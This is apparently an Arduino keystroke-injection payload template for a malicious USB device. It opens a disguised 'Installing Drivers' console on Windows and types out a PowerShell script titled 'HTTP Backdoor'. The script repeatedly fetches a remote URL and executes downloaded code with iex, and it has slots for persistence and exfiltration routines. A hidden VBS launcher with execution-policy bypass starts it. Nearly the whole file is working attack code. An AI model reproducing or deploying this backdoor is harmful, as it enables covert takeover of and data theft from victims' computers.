void setup(){
  Keyboard.begin();
}
void loop(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }
  Keyboard.println(F("echo $pn = $env:COMPUTERNAME + \"  HTTP Backdoor\" > %temp%\\hb.ps1"));
  Keyboard.println(F("echo $user = \"INPUT1\" >> %temp%\\hb.ps1"));
  Keyboard.println(F("echo $pass = \"INPUT2\" >> %temp%\\hb.ps1"));
  Keyboard.println(F("echo $dev = \"INPUT3\" >> %temp%\\hb.ps1"));
  String fn = "hb";
  
  PERSCALLS
  
  Keyboard.println(F("echo while(1){ $exec = 0 >> %temp%\\hb.ps1"));
  Keyboard.println(F("echo sleep 5 >> %temp%\\hb.ps1"));
  Keyboard.println(F("echo $wc = New-Object System.Net.WebClient >> %temp%\\hb.ps1"));
  Keyboard.println(F("echo $fc = $wc.DownloadString(\"INPUT4\") >> %temp%\\hb.ps1"));
  Keyboard.println(F("echo if($fc -eq \"INPUT5\"){ >> %temp%\\hb.ps1"));
  Keyboard.println(F("echo $pv = iex $wc.DownloadString(\"INPUT6\") >> %temp%\\hb.ps1"));
  Keyboard.println(F("echo $exec++  >> %temp%\\hb.ps1"));
  Keyboard.println(F("echo if ($exec -eq 1){ >> %temp%\\hb.ps1"));

  String fn = "hb";
  String fp;
  EXFILCALLS

  Keyboard.println(F("echo sleep 60 }}  >> %temp%\\hb.ps1"));
  Keyboard.println(F("echo if ($fc -eq \"INPUT7\"){ break }} >> %temp%\\hb.ps1"));
  Keyboard.println(F("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\hb.vbs"));
  Keyboard.println(F("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\hb.ps1\"),0,true >> %temp%\\hb.vbs"));
  delay(1000);
  Keyboard.println(F("wscript %temp%\\hb.vbs"));
  delay(1000);
  Keyboard.println(F("exit"));
  while(true);
}

 DEFS
 PERSDEFS
 EXFILDEFS
